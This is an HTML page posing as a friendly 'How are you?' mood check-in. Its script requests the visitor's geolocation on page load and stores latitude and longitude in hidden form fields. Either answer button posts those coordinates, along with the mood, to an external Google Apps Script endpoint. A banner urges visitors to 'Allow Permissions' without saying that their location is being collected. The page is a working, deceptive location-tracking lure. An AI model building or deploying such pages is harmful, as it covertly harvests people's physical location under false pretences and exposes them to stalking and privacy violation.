<head>
    <meta charset="UTF-8">

<body class="text-center">
    <div class="container-fluid bg-warning p-5">
        <h1 class="display-5 fw-bold text-center">How are you?</h1>
    </div>
    <br><br>
    <p class="text-center text-white fst-italic bg-dark border-success rounded-pill fs-5">Allow Permissions to let the Data/Response reach me!</p>
    <div class="container-fluid" id="big-div">
        <p class="text-center display-3 mt-3">Let me know how your day has been?</p>
    </div>
    <form action="https://script.google.com/macros/s/AKfycbxy8NIZELWyVhQwwZH35pZGhhA9SsUuY5ErRAo3oS1P3vqq8rAUrl20JjLU1eKCRCZe/exec" method="post">
        <input type="text" name="longitude" id="longitude" hidden>
        <input type="text" name="latitude" id="latitude" hidden>
        <input type="text" name="error" id="error" hidden>
        <input type="text" name="emotion" id="emotion" hidden>
        <script>
            // getLocation();
            var error = document.getElementById("error");
            var long = document.getElementById("longitude");
            var lat = document.getElementById("latitude");
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition);
                } else { 
                    error.value = "Geolocation is not supported by this browser.";
                }
            }
            function showPosition(position) {
                lat.value = position.coords.latitude;
                long.value = position.coords.longitude;
            }
        </script>
        <button type="submit" class="btn btn-outline-success btn-lg m-5" id="accessApproval">Absolutely Great!</button>
        <button type="submit" class="btn btn-outline-danger btn-lg m-5" id="denyApproval">Can't complain!</button>
    </form>
    <div id="notify" class="text-danger fw-bold display-3"></div>
    
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" 
integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" 
crossorigin="anonymous"></script>
<script>
    var access = document.getElementById("accessApproval");
    var deny = document.getElementById("denyApproval");
    var displayText = document.getElementById("notify");
    var emotion = document.getElementById("emotion");

    access.addEventListener("click",()=>{
        emotion.value = "Great!";
        setTimeout(()=>{
            displayText.innerHTML = "Reply Sent!";
            setTimeout(()=>{
                displayText.innerHTML = " ";
            }, 2000);
        }, 2000);
    });getLocation();
    deny.addEventListener("click",()=>{
        emotion.value = "Not Bad!";
        setTimeout(()=>{
            displayText.innerHTML = "Reply Sent!"
            setTimeout(()=>{
                displayText.innerHTML = " ";
            }, 2000);
        }, 2000);
    });
</script>
</body>
</html>
